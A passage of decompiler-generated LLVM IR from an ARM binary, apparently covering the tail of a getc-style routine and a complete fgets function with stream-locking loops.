  %v2_14cd4 = inttoptr i32 %v1_14cd4 to i32*
  %v3_14cd4 = load i32, i32* %v2_14cd4, align 4
  store i32 %v3_14cd4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14cd8 = icmp eq i32 %v3_14cd4, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_14cd8, label %dec_label_pc_14d0c, label %dec_label_pc_14ce8

dec_label_pc_14ce8:                               ; preds = %entry
  %v1_14ce8 = add i32 %arg1, 16
  %v2_14ce8 = inttoptr i32 %v1_14ce8 to i32*
  %v3_14ce8 = load i32, i32* %v2_14ce8, align 4
  store i32 %v3_14ce8, i32* %r2.global-to-local, align 4
  %v1_14cec = add i32 %arg1, 24
  %v2_14cec = inttoptr i32 %v1_14cec to i32*
  %v3_14cec = load i32, i32* %v2_14cec, align 4
  store i32 %v3_14cec, i32* %r3.global-to-local, align 4
  %v3_14cf0 = icmp uge i32 %v3_14ce8, %v3_14cec
  store i1 %v3_14cf0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_14cf0, label %dec_label_pc_14d00, label %.thread

.thread:                                          ; preds = %dec_label_pc_14ce8
  %v2_14cf4 = inttoptr i32 %v3_14ce8 to i8*
  %v3_14cf4 = load i8, i8* %v2_14cf4, align 1
  %v4_14cf4 = zext i8 %v3_14cf4 to i32
  store i32 %v4_14cf4, i32* %r5.global-to-local, align 4
  %v6_14cf4 = add i32 %v3_14ce8, 1
  store i32 %v6_14cf4, i32* %r2.global-to-local, align 4
  store i32 %v6_14cf4, i32* %v2_14ce8, align 4
  br label %dec_label_pc_14e04

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14ce8
  %v1_14d00 = inttoptr i32 %arg1 to i16*
  %v2_14d00 = call i32 @getc_unlocked(i16* %v1_14d00)
  store i32 %v2_14d00, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14e04

dec_label_pc_14d0c:                               ; preds = %entry
  %v0_14d0c = call i32 @__aeabi_read_tp()
  %v0_14d10 = load i32, i32* @r7, align 4
  %v1_14d10 = add i32 %v0_14d10, 64
  %v2_14d10 = inttoptr i32 %v1_14d10 to i32*
  %v3_14d10 = load i32, i32* %v2_14d10, align 4
  store i32 %v3_14d10, i32* %r3.global-to-local, align 4
  %v1_14d14 = add i32 %v0_14d0c, -1168
  store i32 %v1_14d14, i32* @r6, align 4
  %v3_14d18 = icmp uge i32 %v3_14d10, %v1_14d14
  store i1 %v3_14d18, i1* %cpsr_c.global-to-local, align 1
  %v9_14d18 = icmp eq i32 %v3_14d10, %v1_14d14
  br i1 %v9_14d18, label %dec_label_pc_14d60, label %dec_label_pc_14d20

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14d0c
  %v1_14d20 = add i32 %v0_14d10, 56
  store i32 %v1_14d20, i32* @r5, align 4
  store i32 %v1_14d20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d38.dec_label_pc_14d2c_crit_edge, %dec_label_pc_14d20
  %v0_14d2c = phi i32 [ %v0_14d2c.pre, %dec_label_pc_14d38.dec_label_pc_14d2c_crit_edge ], [ %v1_14d20, %dec_label_pc_14d20 ]
  %v1_14d2c = inttoptr i32 %v0_14d2c to i32*
  %v2_14d2c = load i32, i32* %v1_14d2c, align 4
  store i32 %v2_14d2c, i32* %r3.global-to-local, align 4
  %v1_14d30 = load i32, i32* @r4, align 4
  %v3_14d30 = icmp uge i32 %v2_14d2c, %v1_14d30
  store i1 %v3_14d30, i1* %cpsr_c.global-to-local, align 1
  %v9_14d30 = icmp eq i32 %v2_14d2c, %v1_14d30
  br i1 %v9_14d30, label %dec_label_pc_14d38, label %dec_label_pc_14d50

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d2c
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14d48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d48, label %dec_label_pc_14d4c, label %dec_label_pc_14d38.dec_label_pc_14d2c_crit_edge

dec_label_pc_14d38.dec_label_pc_14d2c_crit_edge:  ; preds = %dec_label_pc_14d38
  %v0_14d2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d2c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d38
  %v0_14d4c = load i32, i32* @r4, align 4
  store i32 %v0_14d4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14d2c, %dec_label_pc_14d4c
  %v0_14d50 = phi i32 [ %v0_14d4c, %dec_label_pc_14d4c ], [ %v2_14d2c, %dec_label_pc_14d2c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d50 = icmp eq i32 %v0_14d50, 0
  br i1 %v2_14d50, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14d50
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14d50, %bb
  store i32 85340, i32* @lr, align 4
  %v1_14d58 = xor i1 %v2_14d50, true
  call void @__pseudo_cond_branch(i1 %v1_14d58, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14d5c = load i32, i32* @r6, align 4
  %v1_14d5c = load i32, i32* @r7, align 4
  %v2_14d5c = add i32 %v1_14d5c, 64
  %v3_14d5c = inttoptr i32 %v2_14d5c to i32*
  store i32 %v0_14d5c, i32* %v3_14d5c, align 4
  %v0_14d60.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d0c, %bb18
  %v1_14d70 = phi i32 [ %v0_14d10, %dec_label_pc_14d0c ], [ %v0_14d60.pre, %bb18 ]
  %v1_14d60 = add i32 %v1_14d70, 60
  %v2_14d60 = inttoptr i32 %v1_14d60 to i32*
  %v3_14d60 = load i32, i32* %v2_14d60, align 4
  store i32 %v3_14d60, i32* %r2.global-to-local, align 4
  %v1_14d64 = add i32 %v1_14d70, 16
  %v2_14d64 = inttoptr i32 %v1_14d64 to i32*
  %v3_14d64 = load i32, i32* %v2_14d64, align 4
  store i32 %v3_14d64, i32* @r1, align 4
  %v1_14d68 = add i32 %v1_14d70, 24
  %v2_14d68 = inttoptr i32 %v1_14d68 to i32*
  %v3_14d68 = load i32, i32* %v2_14d68, align 4
  store i32 %v3_14d68, i32* %r3.global-to-local, align 4
  %v1_14d6c = add i32 %v3_14d60, 1
  store i32 %v1_14d6c, i32* %r2.global-to-local, align 4
  store i32 %v1_14d6c, i32* %v2_14d60, align 4
  %v0_14d74 = load i32, i32* @r1, align 4
  %v1_14d74 = load i32, i32* %r3.global-to-local, align 4
  %v3_14d74 = icmp uge i32 %v0_14d74, %v1_14d74
  store i1 %v3_14d74, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_14d74, label %dec_label_pc_14d84, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14d60
  %v2_14d78 = inttoptr i32 %v0_14d74 to i8*
  %v3_14d78 = load i8, i8* %v2_14d78, align 1
  %v4_14d78 = zext i8 %v3_14d78 to i32
  store i32 %v4_14d78, i32* %r5.global-to-local, align 4
  %v6_14d78 = add i32 %v0_14d74, 1
  store i32 %v6_14d78, i32* @r1, align 4
  %v2_14d7c = load i32, i32* @r7, align 4
  %v3_14d7c = add i32 %v2_14d7c, 16
  %v4_14d7c = inttoptr i32 %v3_14d7c to i32*
  store i32 %v6_14d78, i32* %v4_14d7c, align 4
  br label %dec_label_pc_14d90

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d60
  %v0_14d84 = load i32, i32* @r7, align 4
  %v1_14d88 = inttoptr i32 %v0_14d84 to i16*
  %v2_14d88 = call i32 @getc_unlocked(i16* %v1_14d88)
  store i32 %v2_14d88, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d90

dec_label_pc_14d90:                               ; preds = %.thread2, %dec_label_pc_14d84
  %v0_14d90 = load i32, i32* @r7, align 4
  %v1_14d90 = add i32 %v0_14d90, 60
  %v2_14d90 = inttoptr i32 %v1_14d90 to i32*
  %v3_14d90 = load i32, i32* %v2_14d90, align 4
  %v1_14d94 = add i32 %v3_14d90, -1
  store i32 %v1_14d94, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d98 = icmp eq i32 %v1_14d94, 0
  store i32 %v1_14d94, i32* %v2_14d90, align 4
  br i1 %v2_14d98, label %dec_label_pc_14da4, label %dec_label_pc_14e04

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d90
  %v0_14da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14da4 = load i32, i32* @r7, align 4
  %v2_14da4 = add i32 %v1_14da4, 64
  %v3_14da4 = inttoptr i32 %v2_14da4 to i32*
  store i32 %v0_14da4, i32* %v3_14da4, align 4
  %v0_14da8 = load i32, i32* @r7, align 4
  %v1_14da8 = add i32 %v0_14da8, 56
  store i32 %v1_14da8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dac

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14ddc.dec_label_pc_14dac_crit_edge, %dec_label_pc_14da4
  %v0_14db4 = phi i32 [ %v0_14db4.pre, %dec_label_pc_14ddc.dec_label_pc_14dac_crit_edge ], [ %v1_14da8, %dec_label_pc_14da4 ]
  %v0_14dac = phi i32 [ %v0_14dac.pre, %dec_label_pc_14ddc.dec_label_pc_14dac_crit_edge ], [ %v0_14da8, %dec_label_pc_14da4 ]
  %v1_14dac = add i32 %v0_14dac, 56
  %v2_14dac = inttoptr i32 %v1_14dac to i32*
  %v3_14dac = load i32, i32* %v2_14dac, align 4
  store i32 %v3_14dac, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_14db4, i32* %r2.global-to-local, align 4
  %v1_14db822 = inttoptr i32 %v0_14db4 to i32*
  %v2_14db823 = load i32, i32* %v1_14db822, align 4
  store i32 %v2_14db823, i32* %r3.global-to-local, align 4
  %v3_14dbc25 = icmp uge i32 %v2_14db823, %v3_14dac
  store i1 %v3_14dbc25, i1* %cpsr_c.global-to-local, align 1
  %v9_14dbc31 = icmp eq i32 %v2_14db823, %v3_14dac
  br i1 %v9_14dbc31, label %dec_label_pc_14dc4, label %dec_label_pc_14ddc

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14dac, %dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14dd4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14dd4, label %dec_label_pc_14dd8, label %dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge

dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge:  ; preds = %dec_label_pc_14dc4
  %v0_14db8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14dbc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14db8 = inttoptr i32 %v0_14db8.pre to i32*
  %v2_14db8 = load i32, i32* %v1_14db8, align 4
  store i32 %v2_14db8, i32* %r3.global-to-local, align 4
  %v3_14dbc = icmp uge i32 %v2_14db8, %v1_14dbc.pre
  store i1 %v3_14dbc, i1* %cpsr_c.global-to-local, align 1
  %v9_14dbc = icmp eq i32 %v2_14db8, %v1_14dbc.pre
  br i1 %v9_14dbc, label %dec_label_pc_14dc4, label %dec_label_pc_14ddc

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dc4
  %v0_14dd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14dd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14ddc

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14dac, %dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge, %dec_label_pc_14dd8
  %v0_14de4 = phi i32 [ %v0_14dd8, %dec_label_pc_14dd8 ], [ %v2_14db823, %dec_label_pc_14dac ], [ %v2_14db8, %dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge ]
  %v1_14ddc = phi i32 [ %v0_14dd8, %dec_label_pc_14dd8 ], [ %v3_14dac, %dec_label_pc_14dac ], [ %v1_14dbc.pre, %dec_label_pc_14dc4.dec_label_pc_14db8_crit_edge ]
  %v3_14ddc = icmp uge i32 %v0_14de4, %v1_14ddc
  store i1 %v3_14ddc, i1* %cpsr_c.global-to-local, align 1
  %v9_14ddc = icmp eq i32 %v0_14de4, %v1_14ddc
  br i1 %v9_14ddc, label %dec_label_pc_14de4, label %dec_label_pc_14ddc.dec_label_pc_14dac_crit_edge

dec_label_pc_14ddc.dec_label_pc_14dac_crit_edge:  ; preds = %dec_label_pc_14ddc
  %v0_14dac.pre = load i32, i32* @r7, align 4
  %v0_14db4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dac

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14ddc
  %v2_14de4 = icmp ne i32 %v1_14ddc, 0
  store i1 %v2_14de4, i1* %cpsr_c.global-to-local, align 1
  %v7_14de8 = icmp slt i32 %v1_14ddc, 2
  br i1 %v7_14de8, label %dec_label_pc_14e04, label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14de4
  %v0_14df0 = load i32, i32* @r1, align 4
  %v1_14df0 = add i32 %v0_14df0, 129
  store i32 %v1_14df0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e04

dec_label_pc_14e04:                               ; preds = %.thread, %dec_label_pc_14d90, %dec_label_pc_14dec, %dec_label_pc_14de4, %dec_label_pc_14d00
  %v0_14e04 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e0c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14e0c, i32* @r4, align 4
  store i32 %v6_14cd0, i32* @r5, align 4
  store i32 %v9_14cd0, i32* @r6, align 4
  store i32 %v12_14cd0, i32* @r7, align 4
  store i32 %v15_14cd0, i32* @lr, align 4
  ret i32 %v0_14e04

; uselistorder directives
  uselistorder i32 %v0_14dd8, { 1, 0, 2 }
  uselistorder i32 %v1_14dbc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14d74, { 1, 0, 2 }
  uselistorder i32 %v1_14d70, { 0, 2, 1 }
  uselistorder i32 %v1_14d30, { 1, 0 }
  uselistorder i32 %v3_14ce8, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_14e04, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_14ddc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14dc4, { 1, 0 }
  uselistorder label %dec_label_pc_14d90, { 1, 0 }
  uselistorder label %dec_label_pc_14d60, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_14d50, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_14e14 = load i32, i32* @r4, align 4
  store i32 %v3_14e14, i32* %stack_var_-32, align 4
  %v6_14e14 = load i32, i32* @r5, align 4
  %v9_14e14 = load i32, i32* @r6, align 4
  %v12_14e14 = load i32, i32* @r7, align 4
  %v15_14e14 = load i32, i32* @r8, align 4
  %v24_14e14 = load i32, i32* @lr, align 4
  %v1_14e18 = add i32 %arg3, 52
  %v2_14e18 = inttoptr i32 %v1_14e18 to i32*
  %v3_14e18 = load i32, i32* %v2_14e18, align 4
  store i32 %v3_14e18, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e1c = icmp eq i32 %v3_14e18, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_14e1c, label %dec_label_pc_14e30, label %dec_label_pc_14e94

dec_label_pc_14e30:                               ; preds = %entry
  %v0_14e30 = call i32 @__aeabi_read_tp()
  %v1_14e34 = add i32 %arg3, 64
  %v2_14e34 = inttoptr i32 %v1_14e34 to i32*
  %v3_14e34 = load i32, i32* %v2_14e34, align 4
  store i32 %v3_14e34, i32* %r3.global-to-local, align 4
  %v1_14e38 = add i32 %v0_14e30, -1168
  store i32 %v1_14e38, i32* @r8, align 4
  %v3_14e3c = icmp uge i32 %v3_14e34, %v1_14e38
  store i1 %v3_14e3c, i1* %cpsr_c.global-to-local, align 1
  %v9_14e3c = icmp eq i32 %v3_14e34, %v1_14e38
  br i1 %v9_14e3c, label %dec_label_pc_14e88, label %dec_label_pc_14e44

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14e30
  %v1_14e44 = add i32 %arg3, 56
  store i32 %v1_14e44, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_14e44, i32* %r2.global-to-local, align 4
  %v0_14e50 = load i32, i32* @r6, align 4
  store i32 %v0_14e50, i32* @r4, align 4
  %v1_14e5436 = inttoptr i32 %v1_14e44 to i32*
  %v2_14e5437 = load i32, i32* %v1_14e5436, align 4
  store i32 %v2_14e5437, i32* %r3.global-to-local, align 4
  %v3_14e5839 = icmp uge i32 %v2_14e5437, %v0_14e50
  store i1 %v3_14e5839, i1* %cpsr_c.global-to-local, align 1
  %v9_14e5845 = icmp eq i32 %v2_14e5437, %v0_14e50
  br i1 %v9_14e5845, label %dec_label_pc_14e60, label %dec_label_pc_14e78

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e44, %dec_label_pc_14e60.dec_label_pc_14e54_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14e70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14e70, label %dec_label_pc_14e74, label %dec_label_pc_14e60.dec_label_pc_14e54_crit_edge

dec_label_pc_14e60.dec_label_pc_14e54_crit_edge:  ; preds = %dec_label_pc_14e60
  %v0_14e54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14e58.pre = load i32, i32* @r4, align 4
  %v1_14e54 = inttoptr i32 %v0_14e54.pre to i32*
  %v2_14e54 = load i32, i32* %v1_14e54, align 4
  store i32 %v2_14e54, i32* %r3.global-to-local, align 4
  %v3_14e58 = icmp uge i32 %v2_14e54, %v1_14e58.pre
  store i1 %v3_14e58, i1* %cpsr_c.global-to-local, align 1
  %v9_14e58 = icmp eq i32 %v2_14e54, %v1_14e58.pre
  br i1 %v9_14e58, label %dec_label_pc_14e60, label %dec_label_pc_14e78

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14e60
  %v0_14e74 = load i32, i32* @r4, align 4
  store i32 %v0_14e74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e78

dec_label_pc_14e78:                               ; preds = %dec_label_pc_14e44, %dec_label_pc_14e60.dec_label_pc_14e54_crit_edge, %dec_label_pc_14e74
  %v0_14e78 = phi i32 [ %v0_14e74, %dec_label_pc_14e74 ], [ %v2_14e5437, %dec_label_pc_14e44 ], [ %v2_14e54, %dec_label_pc_14e60.dec_label_pc_14e54_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14e78 = icmp eq i32 %v0_14e78, 0
  br i1 %v2_14e78, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_14e78
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14e78, %bb
  store i32 85636, i32* @lr, align 4
  %v1_14e80 = xor i1 %v2_14e78, true
  call void @__pseudo_cond_branch(i1 %v1_14e80, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14e84 = load i32, i32* @r8, align 4
  %v1_14e84 = load i32, i32* @r7, align 4
  %v2_14e84 = add i32 %v1_14e84, 64
  %v3_14e84 = inttoptr i32 %v2_14e84 to i32*
  store i32 %v0_14e84, i32* %v3_14e84, align 4
  br label %dec_label_pc_14e88

dec_label_pc_14e88:                               ; preds = %dec_label_pc_14e30, %bb20
  %v0_14e88 = load i32, i32* @r7, align 4
  %v1_14e88 = add i32 %v0_14e88, 60
  %v2_14e88 = inttoptr i32 %v1_14e88 to i32*
  %v3_14e88 = load i32, i32* %v2_14e88, align 4
  %v1_14e8c = add i32 %v3_14e88, 1
  store i32 %v1_14e8c, i32* %r3.global-to-local, align 4
  store i32 %v1_14e8c, i32* %v2_14e88, align 4
  %v0_14e94.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_14e98.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_14e9c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14e94

dec_label_pc_14e94:                               ; preds = %entry, %dec_label_pc_14e88
  %v0_14e9c = phi i32 [ %arg3, %entry ], [ %v0_14e9c.pre, %dec_label_pc_14e88 ]
  %v0_14e98 = phi i32 [ %arg2, %entry ], [ %v0_14e98.pre, %dec_label_pc_14e88 ]
  %v0_14e94 = phi i32 [ %arg1, %entry ], [ %v0_14e94.pre, %dec_label_pc_14e88 ]
  store i32 %v0_14e98, i32* %r1.global-to-local, align 4
  store i32 %v0_14e9c, i32* %r2.global-to-local, align 4
  %v3_14ea0 = inttoptr i32 %v0_14e94 to i8*
  %v4_14ea0 = call i32 @__GI_fgets_unlocked(i8* %v3_14ea0, i32 %v0_14e98, i32 %v0_14e9c)
  %v0_14ea4 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ea4 = icmp eq i32 %v0_14ea4, 0
  store i32 %v4_14ea0, i32* %r8.global-to-local, align 4
  br i1 %v2_14ea4, label %dec_label_pc_14eb0, label %dec_label_pc_14f24

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e94
  %v0_14eb0 = load i32, i32* @r7, align 4
  %v1_14eb0 = add i32 %v0_14eb0, 60
  %v2_14eb0 = inttoptr i32 %v1_14eb0 to i32*
  %v3_14eb0 = load i32, i32* %v2_14eb0, align 4
  %v1_14eb4 = add i32 %v3_14eb0, -1
  store i32 %v1_14eb4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14eb8 = icmp eq i32 %v1_14eb4, 0
  store i32 %v1_14eb4, i32* %v2_14eb0, align 4
  br i1 %v2_14eb8, label %dec_label_pc_14ec4, label %dec_label_pc_14f24

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14eb0
  %v0_14ec4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ec4 = load i32, i32* @r7, align 4
  %v2_14ec4 = add i32 %v1_14ec4, 64
  %v3_14ec4 = inttoptr i32 %v2_14ec4 to i32*
  store i32 %v0_14ec4, i32* %v3_14ec4, align 4
  %v0_14ec8 = load i32, i32* @r7, align 4
  %v1_14ec8 = add i32 %v0_14ec8, 56
  store i32 %v1_14ec8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14ecc

dec_label_pc_14ecc:                               ; preds = %dec_label_pc_14efc.dec_label_pc_14ecc_crit_edge, %dec_label_pc_14ec4
  %v0_14ed4 = phi i32 [ %v0_14ed4.pre, %dec_label_pc_14efc.dec_label_pc_14ecc_crit_edge ], [ %v1_14ec8, %dec_label_pc_14ec4 ]
  %v0_14ecc = phi i32 [ %v0_14ecc.pre, %dec_label_pc_14efc.dec_label_pc_14ecc_crit_edge ], [ %v0_14ec8, %dec_label_pc_14ec4 ]
  %v1_14ecc = add i32 %v0_14ecc, 56
  %v2_14ecc = inttoptr i32 %v1_14ecc to i32*
  %v3_14ecc = load i32, i32* %v2_14ecc, align 4
  store i32 %v3_14ecc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_14ed4, i32* %r2.global-to-local, align 4
  %v1_14ed824 = inttoptr i32 %v0_14ed4 to i32*
  %v2_14ed825 = load i32, i32* %v1_14ed824, align 4
  store i32 %v2_14ed825, i32* %r3.global-to-local, align 4
  %v3_14edc27 = icmp uge i32 %v2_14ed825, %v3_14ecc
  store i1 %v3_14edc27, i1* %cpsr_c.global-to-local, align 1
  %v9_14edc33 = icmp eq i32 %v2_14ed825, %v3_14ecc
  br i1 %v9_14edc33, label %dec_label_pc_14ee4, label %dec_label_pc_14efc

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14ecc, %dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14ef4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14ef4, label %dec_label_pc_14ef8, label %dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge

dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge:  ; preds = %dec_label_pc_14ee4
  %v0_14ed8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14edc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14ed8 = inttoptr i32 %v0_14ed8.pre to i32*
  %v2_14ed8 = load i32, i32* %v1_14ed8, align 4
  store i32 %v2_14ed8, i32* %r3.global-to-local, align 4
  %v3_14edc = icmp uge i32 %v2_14ed8, %v1_14edc.pre
  store i1 %v3_14edc, i1* %cpsr_c.global-to-local, align 1
  %v9_14edc = icmp eq i32 %v2_14ed8, %v1_14edc.pre
  br i1 %v9_14edc, label %dec_label_pc_14ee4, label %dec_label_pc_14efc

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14ee4
  %v0_14ef8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14ef8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14ecc, %dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge, %dec_label_pc_14ef8
  %v0_14f04 = phi i32 [ %v0_14ef8, %dec_label_pc_14ef8 ], [ %v2_14ed825, %dec_label_pc_14ecc ], [ %v2_14ed8, %dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge ]
  %v1_14efc = phi i32 [ %v0_14ef8, %dec_label_pc_14ef8 ], [ %v3_14ecc, %dec_label_pc_14ecc ], [ %v1_14edc.pre, %dec_label_pc_14ee4.dec_label_pc_14ed8_crit_edge ]
  %v3_14efc = icmp uge i32 %v0_14f04, %v1_14efc
  store i1 %v3_14efc, i1* %cpsr_c.global-to-local, align 1
  %v9_14efc = icmp eq i32 %v0_14f04, %v1_14efc
  br i1 %v9_14efc, label %dec_label_pc_14f04, label %dec_label_pc_14efc.dec_label_pc_14ecc_crit_edge

dec_label_pc_14efc.dec_label_pc_14ecc_crit_edge:  ; preds = %dec_label_pc_14efc
  %v0_14ecc.pre = load i32, i32* @r7, align 4
  %v0_14ed4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14ecc

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14efc
  %v2_14f04 = icmp ne i32 %v1_14efc, 0
  store i1 %v2_14f04, i1* %cpsr_c.global-to-local, align 1
  %v7_14f08 = icmp slt i32 %v1_14efc, 2
  br i1 %v7_14f08, label %dec_label_pc_14f24, label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14f04
  %v0_14f10 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f10 = add i32 %v0_14f10, 129
  store i32 %v1_14f10, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14eb0, %dec_label_pc_14e94, %dec_label_pc_14f0c, %dec_label_pc_14f04
  %v0_14f24 = load i32, i32* %r8.global-to-local, align 4
  %v2_14f28 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14f28, i32* %r4.global-to-local, align 4
  store i32 %v6_14e14, i32* @r5, align 4
  store i32 %v9_14e14, i32* @r6, align 4
  store i32 %v12_14e14, i32* @r7, align 4
  store i32 %v15_14e14, i32* @r8, align 4
  store i32 %v24_14e14, i32* @lr, align 4
  ret i32 %v0_14f24

; uselistorder directives
  uselistorder i32 %v0_14ef8, { 1, 0, 2 }
  uselistorder i32 %v1_14edc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14e98, { 1, 0 }
  uselistorder i32 %v0_14e9c, { 1, 0 }
  uselistorder i32 %v1_14e58.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
